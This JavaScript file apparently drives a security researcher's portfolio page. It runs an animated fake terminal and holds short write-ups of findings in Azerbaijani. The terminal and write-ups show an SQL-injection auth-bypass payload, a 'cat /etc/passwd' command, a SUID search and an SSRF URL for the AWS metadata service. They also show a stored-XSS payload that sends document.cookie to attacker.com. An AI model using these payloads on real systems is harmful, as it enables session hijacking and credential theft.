
const cursor = document.getElementById('cursor');
const ring = document.getElementById('cursorRing');
let mx = 0, my = 0, rx = 0, ry = 0;
document.addEventListener('mousemove', e => { mx = e.clientX; my = e.clientY; });
function animateCursor() {
    cursor.style.left = mx + 'px'; cursor.style.top = my + 'px';
    rx += (mx - rx) * 0.12; ry += (my - ry) * 0.12;
    ring.style.left = rx + 'px'; ring.style.top = ry + 'px';
    requestAnimationFrame(animateCursor);
}
animateCursor();
document.querySelectorAll('a, button, .post-card, .skill-card').forEach(el => {
    el.addEventListener('mouseenter', () => {
        cursor.style.width = '20px'; cursor.style.height = '20px';
        ring.style.width = '50px'; ring.style.height = '50px';
    });
    el.addEventListener('mouseleave', () => {
        cursor.style.width = '12px'; cursor.style.height = '12px';
        ring.style.width = '36px'; ring.style.height = '36px';
    });
});

const lines = [
    { type: 'cmd', text: 'nmap -sV -sC 10.10.11.42' },
    { type: 'out', text: 'Starting Nmap 7.94...' },
    { type: 'out', text: 'PORT   STATE SERVICE VERSION' },
    { type: 'success', text: '80/tcp open  http    nginx 1.18.0' },
    { type: 'success', text: '443/tcp open ssl/http Apache' },
    { type: 'warn', text: '22/tcp open ssh OpenSSH 8.9' },
    { type: 'cmd', text: 'python3 sqli_scan.py --target $URL' },
    { type: 'danger', text: '[VULN] Error-based SQLi detected!' },
    { type: 'success', text: '[+] Payload: \' OR 1=1-- -' },
    { type: 'cmd', text: 'cat /etc/passwd' },
    { type: 'success', text: 'root:x:0:0:root:/root:/bin/bash' },
];
const body = document.getElementById('terminalBody');
const firstLine = body.querySelector('.t-line');
const termCmd = document.getElementById('termCmd');
const termCursor = document.getElementById('termCursor');
let lineIdx = 0;

function addLine(type, text) {
    const div = document.createElement('div');
    div.className = 't-line';
    const cls = { out: 't-out', success: 't-success', warn: 't-warn', danger: 't-danger' }[type] || 't-out';
    if (type === 'cmd') {
        div.innerHTML = `<span class="t-prompt">❯</span><span class="${cls}">${text}</span>`;
    } else {
        div.innerHTML = `<span class="${cls}">${text}</span>`;
    }

    const existing = body.querySelectorAll('.t-line:not(:last-child)');
    if (existing.length > 12) existing[0].remove();

    body.insertBefore(div, firstLine);
    body.scrollTop = body.scrollHeight;
}

function typeCmd(text, cb) {
    termCmd.textContent = '';
    let i = 0;
    const t = setInterval(() => {
        termCmd.textContent += text[i++];
        if (i >= text.length) { clearInterval(t); cb(); }
    }, 55);
}

function runLine() {
    if (lineIdx >= lines.length) {
        lineIdx = 0;
        // Təkrarlanmadan əvvəl ekranı təmizlə
        const oldLines = body.querySelectorAll('.t-line:not(:last-child)');
        oldLines.forEach(el => el.remove());
        setTimeout(runLine, 2000);
        return;
    }
    const l = lines[lineIdx++];
    if (l.type === 'cmd') {
        termCursor.style.display = 'inline-block';
        typeCmd(l.text, () => {
            termCursor.style.display = 'none';
            setTimeout(() => {
                addLine('cmd', l.text);
                termCmd.textContent = '';
                setTimeout(runLine, 400);
            }, 300);
        });
    } else {
        addLine(l.type, l.text);
        setTimeout(runLine, 350);
    }
}
setTimeout(runLine, 800);

const fadeEls = document.querySelectorAll('.fade-up');
const obs = new IntersectionObserver((entries) => {
    entries.forEach((e, i) => {
        if (e.isIntersecting) {
            setTimeout(() => e.target.classList.add('visible'), i * 80);
        }
    });
}, { threshold: 0.1 });
fadeEls.forEach(el => obs.observe(el));

const postData = [
    {
        id: '0',
        content: `<p>Error-based SQLi texnikasından istifadə edərək login formasında autentifikasiya bypass edildi.</p>
    <p>Payload: <code>' OR 1=1-- -</code> — server MySQL xəta mesajı qaytardı.</p>
    <p><strong>Tövsiyə:</strong> Prepared statements istifadə edin.</p>`,
        tags: ['SQL Injection', 'Auth Bypass', 'sqlmap', 'OWASP A03']
    },
    {
        id: '1',
        content: `<p>Profil bio sahəsinə Stored XSS payload yerləşdirildi, admin cookie oğurlandı.</p>
    <p>Payload: <code>&lt;img src=x onerror="fetch('https://attacker.com?c='+document.cookie)"&gt;</code></p>
    <p><strong>Mükafat:</strong> $750 bug bounty ödənildi.</p>`,
        tags: ['XSS', 'Session Hijacking', 'Bug Bounty', 'OWASP A07']
    },
    {
        id: '2',
        content: `<p>Nikto ilə /backup endpoint tapıldı, credentials əldə edildi.</p>
    <p>Privesc: <code>find / -perm -4000 2>/dev/null</code> ilə SUID binary aşkarlandı.</p>
    <p>GTFOBins üzərindən root shell alındı.</p>`,
        tags: ['HackTheBox', 'Linux', 'SUID', 'Privilege Escalation']
    },
    {
        id: '3',
        content: `<p>API endpoint-də obyekt ID-si birbaşa URL-də göndərilirdi.</p>
    <p>ID dəyişdirilərək başqa istifadəçinin məlumatlarına giriş əldə edildi.</p>
    <p><strong>Fix:</strong> Server tərəfli authorization yoxlaması əlavə edilməlidir.</p>`,
        tags: ['IDOR', 'API Security', 'Authorization', 'OWASP A01']
    },
    {
        id: '4',
        content: `<p>File upload funksiyasında URL parametri server tərəfindən fetch edilirdi.</p>
    <p>Payload: <code>http://169.254.169.254/latest/meta-data/</code> — AWS metadata əldə edildi.</p>
    <p><strong>Impact:</strong> IAM credentials sızdı, tam AWS girişi mümkün oldu.</p>`,
        tags: ['SSRF', 'Cloud Security', 'AWS', 'OWASP A10']
    },
    {
        id: '5',
        content: `<p>RSA açar cütü küçük e dəyəri (e=3) ilə yaradılmışdı.</p>
    <p>Wiener's attack ilə private key yenidən quruldu, şifrəli flag deşifrə edildi.</p>
    <p>Tool: <code>RsaCtfTool.py --attack wiener</code></p>`,
        tags: ['Cryptography', 'RSA', 'CTF', 'PicoCTF']
    }
];

// Kartlara data-id əlavə et (HTML-də əlavə etmək əvəzinə JS ilə)
document.querySelectorAll('.post-card').forEach((card, i) => {
    card.setAttribute('data-id', i);
    card.style.cursor = 'pointer';
    card.addEventListener('click', () => openModal(card));
});

const overlay = document.getElementById('modalOverlay');
const imgArea = document.getElementById('imgArea');
const modalImg = document.getElementById('modalImg');
const imgUpload = document.getElementById('imgUpload');
const imgRemove = document.getElementById('imgRemove');

function openModal(card) {
    const id = card.getAttribute('data-id');
    const data = postData[id];
    const meta = card.querySelector('.post-meta').innerHTML;
    const title = card.querySelector('.post-title').textContent;

    document.getElementById('modalMeta').innerHTML = meta;
    document.getElementById('modalTitle').textContent = title;
    document.getElementById('modalContent').innerHTML = data ? data.content : '<p>Tezliklə...</p>';
    document.getElementById('modalTags').innerHTML = data
        ? data.tags.map(t => `<span class="modal-tag">${t}</span>`).join('')
        : '';

    modalImg.src = '';
    imgArea.classList.remove('has-img');
    overlay.classList.add('open');
    document.body.style.overflow = 'hidden';
}

document.getElementById('modalClose').addEventListener('click', closeModal);
overlay.addEventListener('click', e => { if (e.target === overlay) closeModal(); });
document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });

function closeModal() {
    overlay.classList.remove('open');
    document.body.style.overflow = '';
}

imgUpload.addEventListener('change', e => {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => {
        modalImg.src = ev.target.result;
        imgArea.classList.add('has-img');
    };
    reader.readAsDataURL(file);
});

imgRemove.addEventListener('click', () => {
    modalImg.src = '';
    imgArea.classList.remove('has-img');
    imgUpload.value = '';
});